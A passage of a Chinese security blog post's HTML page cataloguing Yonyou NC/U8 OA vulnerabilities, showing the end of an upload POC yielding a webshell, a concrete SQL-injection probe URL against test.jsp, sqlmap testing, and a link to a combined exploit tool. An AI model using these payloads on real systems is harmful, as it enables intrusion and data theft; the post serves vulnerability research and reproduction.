exp(args.check_url)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(args.check_file):</span><br><span class="line">            multithreading(exp, args.check_file, <span class="number">8</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>利用POC成功上传t00ls.jsp文件</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223947.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224230.png"></p>
+</li>
+<li><p>可以通过该漏洞实现上传webshell。</p>
+</li>
+</ol>
+<h2 id="用友U8-OA-SQL注入漏洞"><a href="#用友U8-OA-SQL注入漏洞" class="headerlink" title="用友U8 OA SQL注入漏洞"></a>用友U8 OA SQL注入漏洞</h2><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友 <code>U8 OA test.jsp</code> 文件存在 <code>SQL</code> 注入漏洞。</p>
+<h3 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友 U8 OA</p>
+<h3 id="复现过程-4"><a href="#复现过程-4" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li><p>检测漏洞URL为<code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20MD5(1))</code>，访问链接显示如下，存在SQL注入漏洞</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224212.png"></p>
+</li>
+<li><p>使用SQLmap尝试SQL注入测试，显示存在漏洞。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224146.png"></p>
+</li>
+</ol>
+<h2 id="综合利用EXP"><a href="#综合利用EXP" class="headerlink" title="综合利用EXP"></a>综合利用EXP</h2><p>github上有用友NC的综合利用EXP：<a target="_blank" rel="noopener" href="https://github.com/asdasdqkq1/yonyou-nc-exp">https://github.com/asdasdqkq1/yonyou-nc-exp</a></p>
+<p>涉及漏洞包括：</p>
+<ul>
+<li>【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞</li>
+<li>用友ERP-NC目录遍历+文件读取漏洞</li>
+<li>用友NC 6.5未授权文件上传漏洞（RCE）</li>
+<li>用友ERP SQL注入漏洞（该漏洞目前网站基本已经不存在，故前面无法复现，没有介绍）</li>
+<li>用友U8 OA SQL注入漏洞</li>
+</ul>
+<p>测试结果如下：</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224336.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224409.png"></p>
+<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E7%94%A8%E5%8F%8BNC%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html" title="用友NC漏洞集合">https://leeyuxun.github.io/用友NC漏洞集合.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E-%E7%94%A8%E5%8F%8BNC/" rel="tag"><i class="fa fa-tag"></i> 漏洞 用友NC</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E8%87%B4%E8%BF%9COA%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html" rel="prev" title="致远OA漏洞集合">
+      <i class="fa fa-chevron-left"></i> 致远OA漏洞集合
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/MetaCRM6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html" rel="next" title="MetaCRM6文件上传漏洞">
+      MetaCRM6文件上传漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90CNVD-2021-30167%E3%80%91-%E7%94%A8%E5%8F%8BNC-BeanShell%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-number">1.4.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%8F%8BERP-NC%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">用友ERP-NC目录遍历+文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-1"><span class="nav-number">2.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%8F%8BNC%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">用友NC控制台密码绕过漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">3.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-2"><span class="nav-number">3.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%8F%8BNC-Cloud-FS%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">用友NC Cloud FS文件管理SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="nav-number">4.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-3"><span class="nav-number">4.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%8F%8BNC-6-5%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">用友NC 6.5未授权文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">5.2.</span> <span class="nav-text">4.2. 影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-number">5.3.</span> <span class="nav-text">4.3.  复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%8F%8BU8-OA-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">用友U8 OA SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-4"><span class="nav-number">6.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-4"><span class="nav-number">6.3.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8EXP"><span class="nav-number">7.</span> <span class="nav-text">综合利用EXP</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'true';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
